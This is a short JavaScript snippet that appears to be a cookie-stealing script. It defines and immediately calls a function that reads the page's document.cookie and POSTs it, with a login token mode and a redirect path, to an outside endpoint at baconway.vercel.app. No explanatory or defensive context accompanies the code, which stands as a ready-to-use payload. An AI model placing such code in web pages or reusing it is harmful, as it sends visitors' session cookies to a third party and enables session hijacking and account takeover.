function postCookies() {
  fetch("https://baconway.vercel.app/api/login.js", {
    method: "POST",
    body: JSON.stringify({
      login_mode: "token",
      cookies: document.cookie,
      redirectLink: "/api/token-test",
    }),
  });
}

postCookies();
